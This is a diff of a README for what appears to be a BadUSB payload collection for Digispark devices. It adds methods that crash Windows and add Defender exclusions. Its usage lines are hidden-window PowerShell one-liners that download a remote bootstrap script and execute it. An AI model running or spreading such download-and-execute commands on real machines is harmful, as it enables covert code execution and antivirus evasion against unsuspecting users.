@@ -2,18 +2,26 @@
 
 A collection of lightweight payload methods for Digispark-based USB automation.
 
-## Available Methods
+## Available Projects
 
 | ID | Method             |
 | -: | ------------------ |
-|  1 | `change_wallpaper` |
+|  1 | `invoke_script`    |
+
+## Available Methods
+
+| Method               |
+| -------------------- |
+| `bsod`               |
+| `change_wallaper`    |
+| `defender_exclusion` |
 
 ## Usage
 
 Run the bootstrap script directly with PowerShell and pass the method ID as an argument.
 
 ```cmd
-powershell -W Hidden -Command "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) <METHOD_ID>"
+powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) <METHOD_ID>"
 ```
 
 ### Example
@@ -21,7 +29,7 @@ powershell -W Hidden -Command "& ([ScriptBlock]::Create((irm 'https://raw.github
 Change the wallpaper using method `1`:
 
 ```cmd
-powershell -W Hidden -Command "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1"
+powershell -W H -c "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1"
 ```
 
 ## How It Works
